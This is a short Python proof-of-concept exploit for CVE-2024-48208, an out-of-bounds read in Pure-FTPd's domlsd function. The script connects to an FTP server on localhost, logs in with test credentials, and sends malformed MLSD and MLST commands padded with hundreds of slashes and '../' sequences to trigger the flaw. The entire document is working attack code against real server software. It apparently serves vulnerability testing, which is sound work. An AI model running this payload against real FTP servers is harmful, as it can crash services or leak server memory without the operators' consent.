#!/usr/bin/env python3
"""
PoC: CVE-2024-48208 - Pure-FTPd domlsd Out-of-Bounds Read
Trigger: MLSD command with crafted path causes OOB read in domlsd() function
"""

import socket

s = socket.socket()
s.connect(("localhost", 2126))
s.recv(1024)  # banner

# Login
s.send(b"USER ftpuser\r\n")
s.recv(1024)
s.send(b"PASS ftpuser\r\n")
s.recv(1024)

# CVE-2024-48208: domlsd function doesn't properly check base pointer bounds
# MLSD with crafted path can trigger OOB read
s.send(b"MLSD " + b"/" * 512 + b"\r\n")
s.recv(1024)

# Alternative trigger using long path with special chars
s.send(b"MLST " + b"../" * 256 + b"\r\n")
s.recv(1024)
s.close()
